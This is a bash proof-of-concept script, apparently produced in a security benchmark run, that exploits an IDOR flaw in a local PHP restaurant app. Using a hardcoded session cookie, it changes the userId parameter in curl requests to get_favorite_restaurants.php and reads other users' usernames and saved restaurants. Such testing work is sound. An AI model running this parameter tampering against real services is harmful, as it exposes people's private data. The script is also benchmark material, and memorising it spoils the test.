#!/bin/bash
# POC: Demonstrates IDOR vulnerability in get_favorite_restaurants.php API endpoint. An authenticated attacker can access other users' favorite restaurants by modifying the userId parameter.
# Target: ./repo
# Created: 2025-12-01T15:58:21.715Z
# Session: benchmark-XBEN-069-24-minbd4jr

# IDOR - Horizontal Privilege Escalation via userId Parameter POC
# This script demonstrates accessing another user's data by manipulating the userId parameter
# in the get_favorite_restaurants.php API endpoint

TARGET_URL="http://localhost:8080"
SESSION_COOKIE="PHPSESSID=u85iiml3o6m2ht6t42o696ed8g"

echo "[*] IDOR Vulnerability POC - Horizontal Privilege Escalation"
echo "[*] Target: $TARGET_URL"
echo "[*] Session: $SESSION_COOKIE"
echo ""

# Test 1: Access another user's favorite restaurants
echo "[TEST 1] Accessing userId=1 (another user's data) with authenticated session"
echo "Command: curl -s -H 'Cookie: $SESSION_COOKIE' '$TARGET_URL/api/get_favorite_restaurants.php?userId=1'"
echo ""

RESPONSE=$(curl -s -H "Cookie: $SESSION_COOKIE" "$TARGET_URL/api/get_favorite_restaurants.php?userId=1")
echo "Response:"
echo "$RESPONSE"
echo ""

# Check if we successfully retrieved data for a different user
if echo "$RESPONSE" | grep -q '"success":true' && echo "$RESPONSE" | grep -q '"restaurants"'; then
    echo "[✓] SUCCESS: IDOR vulnerability confirmed!"
    echo "[✓] Authenticated user was able to access another user's private data"
    USERNAME=$(echo "$RESPONSE" | grep -o '"username":"[^"]*"' | cut -d'"' -f4)
    echo "[✓] Retrieved username: $USERNAME"
    RESTAURANTS=$(echo "$RESPONSE" | grep -o '"restaurants":\[[^]]*\]')
    echo "[✓] Retrieved restaurants: $RESTAURANTS"
    echo ""
else
    echo "[✗] Failed to retrieve data or authorization is properly implemented"
    exit 1
fi

# Test 2: Try to access another user ID to show the vulnerability is systematic
echo "[TEST 2] Attempting to access userId=5 (different user)"
echo "Command: curl -s -H 'Cookie: $SESSION_COOKIE' '$TARGET_URL/api/get_favorite_restaurants.php?userId=5'"
echo ""

RESPONSE2=$(curl -s -H "Cookie: $SESSION_COOKIE" "$TARGET_URL/api/get_favorite_restaurants.php?userId=5")
echo "Response:"
echo "$RESPONSE2"
echo ""

if echo "$RESPONSE2" | grep -q '"success":true'; then
    echo "[✓] IDOR vulnerability is systematic - multiple user IDs accessible"
else
    echo "[✓] Limited data available for this user ID"
fi

echo ""
echo "[SUMMARY] IDOR vulnerability allows horizontal privilege escalation by modifying userId parameter"